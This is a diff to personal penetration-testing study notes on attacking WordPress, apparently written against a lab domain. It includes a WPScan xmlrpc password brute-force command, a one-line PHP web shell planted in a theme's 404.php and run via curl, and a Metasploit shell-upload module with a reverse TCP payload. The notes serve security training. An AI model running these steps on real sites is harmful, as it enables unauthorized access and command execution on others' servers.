@@ -20,6 +20,7 @@ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
 ```
 
 # Wordpress
+* php backend!
 ### Discovery
 Typical `/robots.txt` file:
 ```
@@ -56,4 +57,33 @@ Sitemap: https://inlanefreight.local/wp-sitemap.xml
 ### Login Bruteforce
 * WPscan can do this
 * two kinds of attacks 
-	* `wp-login` will attempt to 
+	* `wp-login` will attempt to bruteforce the standard login page
+	* `xmlrpc` uses wordpress API to make login attempts through `/.xmlrpc.php`
+		* generally faster
+* ex:
+```bash
+sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+```
+
+### Code Execution
+* Done with wp themes
+* click on `appearance` and select theme editor
+* An inactive theme can be selected to avoid corrupting the primary theme
+* Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell
+* This code should let us execute commands via the GET parameter `0`
+	* avoids too much modification of contents
+```php
+system($_GET[0]);
+```
+* Click on `Update File` at the bottom to save
+* can use curl to gain access
+```bash
+curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+```
+* `wp_admin_shell_upload` in metasploit can be used to upload a shell and execute it automatically
+	* the `php/meterpreter/reverse_tcp` payload should work fine
+* Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail
+	* make sure to document and clean up
+* most vulns in wordpress are with the plugins (89%)
+* Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.
+* 
